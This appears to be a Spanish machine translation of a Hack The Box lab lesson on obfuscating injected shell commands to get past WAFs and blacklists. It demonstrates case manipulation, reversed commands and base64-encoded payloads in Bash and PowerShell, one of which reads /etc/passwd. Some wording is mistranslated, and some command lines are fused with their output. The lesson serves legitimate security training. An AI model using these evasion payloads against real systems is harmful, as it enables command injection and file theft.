# Advanced Command Obfuscation

En algunos casos, podemos estar tratando con soluciones de filtrado avanzadas, como los firewalls de aplicaciones web (WAF), y las técnicas básicas de evasión pueden no funcionar necesariamente. Podemos utilizar técnicas más avanzadas para tales ocasiones, lo que hace que la detección de los comandos inyectados sea mucho menos probable.

---

# **Manipulación de casos**

Una técnica de ofuscación de comando que podemos usar es la manipulación de casos, como invertir los casos de caracteres de un comando (por ejemplo,`WHOAMI`) o alternando entre casos (por ejemplo`WhOaMi`). Esto generalmente funciona porque una lista negra de comando puede no verificar las diferentes variaciones de casos de una sola palabra, ya que los sistemas de Linux son sensibles a los casos.

Si estamos tratando con un servidor de Windows, podemos cambiar la carcasa de los caracteres del comando y enviarlo. En Windows, los comandos para PowerShell y CMD son insensibles a los casos, lo que significa que ejecutarán el comando independientemente del caso en el que esté escrito:

Ofuscación de comando avanzado

```powershell
PS C:\htb> WhOaMi

21y4d

```

Sin embargo, cuando se trata de Linux y un shell bash, que son sensibles a los casos, como se mencionó anteriormente, tenemos que ser un poco creativos y encontrar un comando que convierte el comando en una palabra de All-Lowdercase. Un comando de trabajo que podemos usar es el siguiente:

Ofuscación de comando avanzado

```
21y4d@htb[/htb]$ $(tr "[A-Z]" "[a-z]"<<<"WhOaMi")

21y4d

```

Como podemos ver, el comando funcionó, a pesar de que la palabra que proporcionamos fue (`WhOaMi`). Este comando usa`tr`Reemplazar todos los caracteres de mayúsculas con caracteres de caso inferior, lo que da como resultado un comando de caracteres de todo el caso inferior. Sin embargo, si intentamos usar el comando anterior con el`Host Checker`Aplicación web, veremos que todavía se bloquea:

### **Solicitud de publicación de Burp**

![](https://academy.hackthebox.com/storage/modules/109/cmdinj_filters_commands_3.jpg)

`Can you guess why?`Es porque el comando anterior contiene espacios, que es un carácter filtrado en nuestra aplicación web, como hemos visto antes. Entonces, con tales técnicas,`we must always be sure not to use any filtered characters`de lo contrario, nuestras solicitudes fallarán, y podemos pensar que las técnicas no funcionaron.

Una vez que reemplazamos los espacios con pestañas (`%09`), vemos que el comando funciona perfectamente:

### **Solicitud de publicación de Burp**

![](https://academy.hackthebox.com/storage/modules/109/cmdinj_filters_commands_4.jpg)

Hay muchos otros comandos que podemos usar para el mismo propósito, como el siguiente:

Código:intento

```bash
$(a="WhOaMi";printf %s "${a,,}")
```

Ejercicio: ¿Puede probar el comando anterior para ver si funciona en su VM Linux y luego intentar evitar usar caracteres filtrados para que funcione en la aplicación web?

---

# **Comandos invertidos**

Otra técnica de ofuscación de comandos que discutiremos es revertir los comandos y tener una plantilla de comando que los cambie y los ejecute en tiempo real. En este caso, estaremos escribiendo`imaohw`en lugar de`whoami`para evitar activar el comando con lista negra.

Podemos ser creativos con tales técnicas y crear nuestros propios comandos Linux/Windows que eventualmente ejecutan el comando sin contener las palabras de comando reales. Primero, tendríamos que obtener la cadena invertida de nuestro comando en nuestro terminal, como sigue:

Ofuscación de comando avanzado

```
xnoxos@htb[/htb]$ echo 'whoami' | revimaohw

```

Luego, podemos ejecutar el comando original volviendo a invertirlo en una subheca (`$()`), como sigue:

Ofuscación de comando avanzado

```
21y4d@htb[/htb]$ $(rev<<<'imaohw')

21y4d

```

Vemos que a pesar de que el comando no contiene el`whoami`palabra, funciona igual y proporciona el resultado esperado. También podemos probar este comando con nuestro ejercicio, y de hecho funciona:

### **Solicitud de publicación de Burp**

![](https://academy.hackthebox.com/storage/modules/109/cmdinj_filters_commands_5.jpg)

Consejo: si quisiera omitir un filtro de caracteres con el método anterior, tendría que revertirlos también o incluirlos al revertir el comando original.

Lo mismo se puede aplicar en`Windows.`Primero podemos revertir una cadena, como sigue:

Ofuscación de comando avanzado

```powershell
PS C:\htb> "whoami"[-1..-20] -join ''

imaohw

```

Ahora podemos usar el siguiente comando para ejecutar una cadena invertida con una subhorro de PowerShell (`iex "$()"`), como sigue:

Ofuscación de comando avanzado

```powershell
PS C:\htb> iex "$('imaohw'[-1..-20] -join '')"

21y4d

```

---

# **Comandos codificados**

La técnica final que discutiremos es útil para los comandos que contienen caracteres filtrados o caracteres que el servidor puede decodificar URL. Esto puede permitir que el comando se enoje cuando llegue al shell y finalmente no se ejecuta. En lugar de copiar un comando existente en línea, intentaremos crear nuestro propio comando de ofuscación único esta vez. De esta manera, es mucho menos probable que sea negado por un filtro o un WAF. El comando que creamos será único para cada caso, dependiendo de qué caracteres estén permitidos y el nivel de seguridad en el servidor.

Podemos utilizar varias herramientas de codificación, como`base64`(para codificación B64) o`xxd`(para la codificación hexadecimal). Tomemos`base64`Como ejemplo. Primero, codificaremos la carga útil que queremos ejecutar (que incluye caracteres filtrados):

Ofuscación de comando avanzado

```
xnoxos@htb[/htb]$ echo -n 'cat /etc/passwd | grep 33' | base64Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==

```

Ahora podemos crear un comando que decodifique la cadena codificada en una subhorro (`$()`), y luego pasarlo a`bash`para ser ejecutado (es decir`bash<<<`), como sigue:

Ofuscación de comando avanzado

```
xnoxos@htb[/htb]$ bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)

www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin

```

Como podemos ver, el comando anterior ejecuta el comando perfectamente. No incluimos caracteres filtrados y evitamos caracteres codificados que puedan llevar al comando a no ejecutar.

Consejo: Tenga en cuenta que estamos usando`<<<`Para evitar usar una tubería`|`, que es un carácter filtrado.

Ahora podemos usar este comando (una vez que reemplazamos los espacios) para ejecutar el mismo comando a través de la inyección de comando:

### **Solicitud de publicación de Burp**

![](https://academy.hackthebox.com/storage/modules/109/cmdinj_filters_commands_6.jpg)

Incluso si se filtraron algunos comandos, como`bash`o`base64`, podríamos omitir ese filtro con las técnicas que discutimos en la sección anterior (por ejemplo, inserción de personajes), o usar otras alternativas como`sh`para la ejecución del comando y`openssl`para la decodificación B64, o`xxd`para la decodificación hexadecimal.

También usamos la misma técnica con Windows. Primero, necesitamos BASE64 codificar nuestra cadena, como sigue:

Ofuscación de comando avanzado

```powershell
PS C:\htb> [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))

dwBoAG8AYQBtAGkA

```

También podemos lograr lo mismo en Linux, pero tendríamos que convertir la cadena de`utf-8`a`utf-16`antes de que nosotros`base64`Es, como sigue:

Ofuscación de comando avanzado

```
xnoxos@htb[/htb]$ echo -n whoami | iconv -f utf-8 -t utf-16le | base64dwBoAG8AYQBtAGkA

```

Finalmente, podemos decodificar la cadena B64 y ejecutarla con una subhectiva de PowerShell (`iex "$()"`), como sigue:

Ofuscación de comando avanzado

```powershell
PS C:\htb> iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"

21y4d

```

Como podemos ver, podemos ser creativos con`Bash`o`PowerShell`y crear nuevos métodos de omisión y ofuscación que no se hayan utilizado antes y, por lo tanto, es muy probable que pasen por alto filtros y WAFS. Varias herramientas pueden ayudarnos a ofuscar automáticamente nuestros comandos, que discutiremos en la siguiente sección.

Además de las técnicas que discutimos, podemos utilizar numerosos otros métodos, como comodines, regex, redirección de salida, expansión de enteros y muchos otros. Podemos encontrar algunas técnicas de este tipo en[Entrega de carga útil](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-with-variable-expansion).